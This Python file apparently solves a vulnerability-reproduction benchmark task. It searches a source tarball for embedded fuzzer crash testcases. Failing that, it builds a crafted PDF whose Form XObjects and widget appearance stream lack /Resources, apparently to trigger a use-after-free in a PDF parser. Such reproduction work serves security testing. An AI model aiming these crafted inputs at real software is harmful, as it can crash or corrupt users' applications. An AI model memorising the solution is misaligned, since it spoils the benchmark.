import os
import re
import tarfile
from typing import Optional, List, Tuple


def _read_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> Optional[bytes]:
    if not m.isreg():
        return None
    if m.size <= 0 or m.size > max_bytes:
        return None
    f = t.extractfile(m)
    if f is None:
        return None
    try:
        return f.read()
    finally:
        try:
            f.close()
        except Exception:
            pass


def _find_embedded_poc_in_tar(src_path: str) -> Optional[bytes]:
    name_hi_re = re.compile(
        r"(clusterfuzz[-_]?testcase[-_]?minimized|testcase[-_]?minimized|repro|poc|crash|asan|uaf|heap[-_]?use[-_]?after[-_]?free|cve)",
        re.IGNORECASE,
    )
    name_mid_re = re.compile(r"(testcase|fuzz|corpus|seed|regression|issue)", re.IGNORECASE)
    pdf_header = b"%PDF-"

    candidates: List[Tuple[int, int, bytes]] = []
    try:
        with tarfile.open(src_path, "r:*") as t:
            for m in t:
                if not m.isreg():
                    continue
                n = m.name.replace("\\", "/")
                bn = os.path.basename(n)
                if m.size <= 0 or m.size > 2_000_000:
                    continue

                score = 0
                if name_hi_re.search(n) or name_hi_re.search(bn):
                    score += 10
                if name_mid_re.search(n) or name_mid_re.search(bn):
                    score += 2
                if bn.lower().endswith((".pdf", ".fdf")):
                    score += 3

                if score < 10:
                    continue

                data = _read_tar_member(t, m)
                if not data:
                    continue

                if data.startswith(pdf_header):
                    score += 3
                candidates.append((score, len(data), data))
    except Exception:
        return None

    if not candidates:
        return None

    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][2]


def _pdf_stream(dict_entries: bytes, data: bytes) -> bytes:
    if not data.endswith(b"\n"):
        data += b"\n"
    d = b"<< " + dict_entries + b" /Length " + str(len(data)).encode("ascii") + b" >>\n"
    return d + b"stream\n" + data + b"endstream\n"


def _build_pdf(objects: List[bytes]) -> bytes:
    out = bytearray()
    out.extend(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0] * (len(objects) + 1)

    for i, body in enumerate(objects, start=1):
        offsets[i] = len(out)
        out.extend(f"{i} 0 obj\n".encode("ascii"))
        out.extend(body)
        if not body.endswith(b"\n"):
            out.extend(b"\n")
        out.extend(b"endobj\n")

    xref_offset = len(out)
    out.extend(b"xref\n")
    out.extend(f"0 {len(objects) + 1}\n".encode("ascii"))
    out.extend(b"0000000000 65535 f \n")
    for i in range(1, len(objects) + 1):
        out.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))

    out.extend(b"trailer\n")
    out.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode("ascii"))
    out.extend(b"startxref\n")
    out.extend(f"{xref_offset}\n".encode("ascii"))
    out.extend(b"%%EOF\n")
    return bytes(out)


def _generate_pdf_poc() -> bytes:
    # Multi-FormXObject chain without /Resources to force parent resource dict usage.
    n_forms = 6

    form_objs = []
    for i in range(n_forms):
        form_data = (
            b"q\n"
            b"BT\n"
            b"/F1 12 Tf\n"
            b"1 0 0 1 0 0 Tm\n"
            b"(x) Tj\n"
            b"ET\n"
            b"Q\n"
        )
        form_dict = b"/Type /XObject /Subtype /Form /BBox [0 0 100 100]"
        form_objs.append(_pdf_stream(form_dict, form_data))

    contents_lines = [b"q\n"]
    for i in range(n_forms):
        contents_lines.append(f"/Fm{i} Do\n".encode("ascii"))
    contents_lines.append(b"Q\n")
    contents_lines.append(b"BT\n")
    contents_lines.append(b"/F1 12 Tf\n")
    contents_lines.append(b"72 200 Td\n")
    contents_lines.append(b"(Hello) Tj\n")
    contents_lines.append(b"ET\n")
    contents_data = b"".join(contents_lines)
    contents_obj = _pdf_stream(b"", contents_data)

    # Widget annotation with appearance stream missing /Resources as well.
    ap_data = (
        b"q\n"
        b"0 0 1 rg\n"
        b"0 0 20 20 re\n"
        b"f\n"
        b"Q\n"
    )
    ap_obj = _pdf_stream(b"/Type /XObject /Subtype /Form /BBox [0 0 20 20]", ap_data)

    # Object numbering:
    # 1 Catalog
    # 2 Pages
    # 3 Page
    # 4 Contents
    # 5 Font
    # 6..(5+n_forms) Forms
    # (6+n_forms) Widget annot
    # (7+n_forms) Appearance stream
    obj_catalog_num = 1
    obj_pages_num = 2
    obj_page_num = 3
    obj_contents_num = 4
    obj_font_num = 5
    obj_first_form_num = 6
    obj_widget_num = obj_first_form_num + n_forms
    obj_ap_num = obj_widget_num + 1

    xobj_entries = []
    for i in range(n_forms):
        xobj_entries.append(f"/Fm{i} {obj_first_form_num + i} 0 R".encode("ascii"))
    xobj_dict = b"<< " + b" ".join(xobj_entries) + b" >>"
    resources_dict = b"<< /Font << /F1 5 0 R >> /XObject " + xobj_dict + b" >>"

    catalog = (
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/AcroForm << /Fields [" + f"{obj_widget_num} 0 R".encode("ascii") + b"] >>"
        b" >>\n"
    )
    pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
    page = (
        b"<< /Type /Page /Parent 2 0 R "
        b"/MediaBox [0 0 300 300] "
        b"/Resources " + resources_dict + b" "
        b"/Contents 4 0 R "
        b"/Annots [" + f"{obj_widget_num} 0 R".encode("ascii") + b"]"
        b" >>\n"
    )
    font = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n"
    widget = (
        b"<< /Type /Annot /Subtype /Widget "
        b"/Rect [50 50 150 80] "
        b"/F 4 "
        b"/T (a) "
        b"/FT /Tx "
        b"/V (b) "
        b"/P 3 0 R "
        b"/AP << /N " + f"{obj_ap_num} 0 R".encode("ascii") + b" >>"
        b" >>\n"
    )

    objects: List[bytes] = []
    objects.append(catalog)      # 1
    objects.append(pages)        # 2
    objects.append(page)         # 3
    objects.append(contents_obj) # 4
    objects.append(font)         # 5
    objects.extend(form_objs)    # 6..(5+n_forms)
    objects.append(widget)       # (6+n_forms)
    objects.append(ap_obj)       # (7+n_forms)

    return _build_pdf(objects)


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        if os.path.isfile(src_path):
            poc = _find_embedded_poc_in_tar(src_path)
        if poc is not None and len(poc) > 0:
            return poc
        return _generate_pdf_poc()